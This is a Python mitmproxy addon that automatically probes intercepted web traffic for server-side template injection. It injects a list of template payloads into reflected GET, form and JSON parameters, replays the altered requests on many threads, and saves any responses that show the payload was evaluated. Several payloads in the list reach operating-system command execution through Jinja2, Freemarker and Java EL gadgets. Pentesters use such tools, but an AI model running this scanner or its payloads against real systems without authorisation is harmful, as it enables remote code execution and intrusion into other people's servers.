from mitmproxy import http, ctx
from mitmproxy.io import FlowWriter
import copy
import os
import urllib.parse
import json
import re
import time
from concurrent.futures import ThreadPoolExecutor

class SSTIResponse:
    def __init__(self):
        self.flow_dir_ssti = "ssti_flows"
        os.makedirs(self.flow_dir_ssti, exist_ok=True)
        self.alteration_indicators_ssti = ["{{95459879*95459879}}", "${95459879*95459879}", "<%= 95459879*95459879 %>", "#{95459879*95459879}", "*{95459879*95459879}", "{{'95459879'|multiply('95459879')}}", "{math equation=\"95459879*95459879\"}", "{{config.items()}}", "#set($x = 95459879*95459879)", "<#assign x=95459879*95459879>${x}", "${95459879*95459879}", "${95459879*95459879}", "{{95459879*'95459879'}}", "{{95459879*'95459879'}}", "{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('95459879*95459879').read()}}", "{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['sys'].modules['os'].popen('95459879*95459879').read()}}", "{{config.__class__.__init__.__globals__['os'].popen('95459879*95459879').read()}}", "{{''.__class__.mro()[2].__subclasses__()[40]('95459879*95459879').read()}}", "{{''.__class__.mro()[1].__subclasses__()[396]('95459879*95459879',shell=True,stdout=-1).communicate()}}", "<%= debug('95459879*95459879') %>", "#{T(java.lang.Runtime).getRuntime().exec('95459879*95459879')}", "#if($x == '95459879*95459879')true#{end}", "<#list .data_model?keys as key>${'95459879*95459879'}</#list>", "<#assign command=\"freemarker.template.utility.Execute\"?new()>${command('95459879*95459879')}", "${\"freemarker.template.utility.Execute\"?new()('95459879*95459879')}", "{{95459879*'95459879'}}", "{{ '95459879'*95459879 }}", "{{request.application.__globals__.__builtins__.__import__('os').popen('95459879*95459879').read()}}", "{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('95459879*95459879')['read']()}}", "{{''.__class__.__mro__[2].__subclasses__()[40]('95459879*95459879').read()}}", "${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(null, '95459879*95459879')}"]
        self.altered_header_ssti = "x-altered-ssti"

    def response(self, flow: http.HTTPFlow) -> None:  
        if self.altered_header_ssti in flow.request.headers:
            self.check_altered_reflection_ssti(flow)
            return

        if flow.request.method == "GET":
            self.process_parameters_ssti(flow, flow.request.query)
        elif flow.request.method == "POST":
            self.process_post_request_ssti(flow)

    def process_post_request_ssti(self, flow):

        content_type = flow.request.headers.get("Content-Type", "")
        if "application/x-www-form-urlencoded" in content_type:
            params = urllib.parse.parse_qs(flow.request.get_text())
            self.process_parameters_ssti(flow, params)
        elif "application/json" in content_type:
            try:
                params = json.loads(flow.request.get_text())
                if isinstance(params, dict):
                    self.process_parameters_ssti(flow, params)
            except json.JSONDecodeError:
                ctx.log.info("JSON decode error")

    def process_parameters_ssti(self, flow, params):
        def process_value(param, value):
            
            if isinstance(value, str):
                self.escaped_value = value
                # Your existing logic for using escaped_value
            elif isinstance(value, list):
                # If the value is a list, process each item
                value = value[0]
                self.escaped_value = value
            elif isinstance(value, dict):
                # If the value is a dict, recursively process each key-value pair
                for key, val in value.items():
                    process_value(f"{param}[{key}]", val)  # Adjust the param name as needed
                    self.escaped_value = val
            else:
                # Optionally handle other non-string types or log them
                ctx.log.info(f"Unhandled value type for param '{param}': {type(value)}")
            
                # Define patterns to search for in the response body
            if self.escaped_value in flow.response.text:
                self.handle_reflection_ssrf(flow, param, self.escaped_value)
            
        for param, value in params.items():

            process_value(param, value)
            

    def handle_reflection_ssrf(self, flow, param, value):
        with ThreadPoolExecutor(max_workers=100) as executor:
            # Logic to handle the reflection, e.g., logging, altering, and replaying
            for indicator in self.alteration_indicators_ssti:
                executor.submit(self.alter_and_replay_ssti, flow, param, value, indicator)
    def alter_and_replay_ssti(self, original_flow, param, original_value, indicator):
        altered_value = original_value + indicator
        altered_flow = self.alter_request_ssti(original_flow, param, altered_value)
        if altered_flow:
            ctx.master.commands.call("replay.client", [altered_flow])

    def alter_request_ssti(self, original_flow, param, altered_value):
        new_request = copy.deepcopy(original_flow.request)
        if original_flow.request.method == "GET":
            new_request.query[param] = altered_value
        else:
            content_type = new_request.headers.get("Content-Type", "")
            if "application/x-www-form-urlencoded" in content_type:
                params = urllib.parse.parse_qs(new_request.get_text())
                params[param] = [altered_value]
                new_request.text = urllib.parse.urlencode(params, doseq=True)
            elif "application/json" in content_type:
                try:
                    body = json.loads(new_request.get_text())
                    if isinstance(body, dict):
                        body[param] = altered_value
                        new_request.text = json.dumps(body)
                except json.JSONDecodeError:
                    pass
        new_request.headers[self.altered_header_ssti] = "true"
        altered_flow = http.HTTPFlow(original_flow.client_conn, original_flow.server_conn)
        altered_flow.request = new_request
        return altered_flow

    def check_altered_reflection_ssti(self, flow):
        pattern = re.compile(r'9112588498694640')  # Example pattern, adjust as needed
        if pattern.search(flow.response.text):
            self.save_flow_ssti(flow)

    def save_flow_ssti(self, flow):
        filename = os.path.join(self.flow_dir_ssti, f"{flow.request.method}_captured_{int(time.time())}.mitm")
        try:
            with open(filename, "wb") as file:
                fw = FlowWriter(file)
                fw.add(flow)
            ctx.log.info(f"Saved ssti flow to {filename}")
        except OSError as e:
            ctx.log.error(f"Error saving .mitm file: {e}")

addons = [SSTIResponse()]
